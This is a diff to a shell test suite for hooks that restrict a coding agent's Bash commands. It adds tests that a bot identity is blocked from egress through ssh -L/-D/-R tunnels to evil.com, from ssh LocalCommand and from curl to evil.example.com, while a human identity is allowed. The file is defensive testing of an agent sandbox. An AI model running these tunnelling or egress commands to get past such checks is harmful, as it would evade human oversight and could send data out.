@@ -52,6 +52,22 @@ assert_exit() {
   fi
 }
 
+# assert_exit_env <ENV=val> <expected> <hook> <json-input> <description> — like assert_exit but
+# runs the hook with one extra environment variable set (for identity-aware rails, #440).
+assert_exit_env() {
+  local env_kv="$1" expected="$2" hook="$3" input="$4" desc="$5" actual
+  set +e
+  printf '%s' "$input" | env "$env_kv" python3 "$hook" >/dev/null 2>&1
+  actual=$?
+  set -e
+  if [ "$actual" = "$expected" ]; then
+    echo "  ok: $desc (exit=$actual)"
+  else
+    echo "  FAIL: $desc — expected exit=$expected, got exit=$actual" >&2
+    fail=1
+  fi
+}
+
 echo "== require-delegation-model.py =="
 RDM="$HOOKS/require-delegation-model.py"
 assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","prompt":"x"}}'              "blocks generic subagent_type=claude with no model="
@@ -571,6 +587,21 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -o proxyco
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -o LocalCommand=evilcmd -o PermitLocalCommand=yes root@192.168.1.1"}}' "blocks LocalCommand (runs a local command on connect)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"scp file root@192.168.1.1:/tmp/"}}'                                "blocks scp even to a LAN destination (file movers stay blocked)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh"}}'                                                            "blocks ssh with no destination (carve-out fails closed)"
+# #442: -D/-L/-R/-w turn even a LAN-destination ssh into an egress channel (tunnel through / SOCKS
+# proxy on the LAN box reaches arbitrary public hosts), so the private-dest carve-out must NOT exempt.
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -L 8080:evil.com:80 192.168.1.5"}}'                            "blocks LAN ssh with a -L local forward (tunnel egress) (#442)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -L8080:evil.com:80 192.168.1.5"}}'                             "blocks LAN ssh with a glued -L forward (#442)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -D 1080 root@192.168.1.5"}}'                                   "blocks LAN ssh with a -D SOCKS proxy (#442)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -R 9000:localhost:22 admin@owl-tegu.lan"}}'                     "blocks LAN ssh with a -R remote forward (#442)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ssh -p 2222 root@192.168.1.5 uptime"}}'                            "still allows plain LAN ssh past value flags (carve-out intact) (#442)"
+
+echo "== pretooluse-bash.py identity-aware arming (#440) =="
+PTB="$HOOKS/pretooluse-bash.py"
+# The autonomous bot (~/.claude-bot) ARMS block-egress that the interactive human relaxed; the
+# human set is unchanged. Detected via CLAUDE_CONFIG_DIR ending in -bot; fail-safe to human set.
+assert_exit_env "CLAUDE_CONFIG_DIR=$HOME/.claude-bot" 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.example.com/x"}}' "bot identity ARMS block-egress: bare curl-public blocked (#440)"
+assert_exit_env "CLAUDE_CONFIG_DIR=$HOME/.claude"     0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.example.com/x"}}' "human identity keeps block-egress relaxed: curl-public allowed (#440)"
+assert_exit_env "CLAUDE_CONFIG_DIR=$HOME/.claude-bot" 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"git status"}}'                       "bot arming does not over-block a benign command (#440)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"bash -c '"'"'ssh 192.168.1.1'"'"'"}}'                              "interpreter-payload ssh scan has NO carve-out (NET_RE unchanged)"
 # #179: `command`/`exec`/`builtin` shift the real command word out of argv[0] the same way
 # sudo/env/timeout do — extend the one canonicalization pass to them too (CLAUDE.md #129).
